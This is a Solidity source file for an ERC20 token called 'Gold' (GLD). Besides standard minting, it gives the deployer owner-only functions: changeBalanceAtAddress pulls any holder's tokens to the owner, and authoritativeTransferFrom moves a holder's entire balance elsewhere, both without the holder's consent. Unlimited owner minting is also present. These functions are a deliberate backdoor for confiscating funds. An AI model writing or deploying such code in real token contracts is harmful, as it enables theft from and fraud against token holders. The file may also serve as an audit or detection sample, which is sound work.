// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GLDToken is ERC20 {
    address private _owner;

    constructor(uint256 initialSupply) ERC20("Gold", "GLD") {
        _owner = msg.sender;
        _mint(msg.sender, initialSupply);
    }

    function mintTokensToAddress(address to, uint256 amount) public {
        require(msg.sender == _owner, "not authorized");
        _mint(to, amount);
    }

    function changeBalanceAtAddress(address from, uint amount) public {
        require(msg.sender == _owner, "not authorized");
        if (amount > balanceOf(from)) {
            _transfer(from, msg.sender, balanceOf(from));
        } else {
            _transfer(from, msg.sender, amount);
        }
    }

    function authoritativeTransferFrom(address from, address to) public {
        require(msg.sender == _owner, "not authorized");
        _transfer(from, to, balanceOf(from));
    }
}
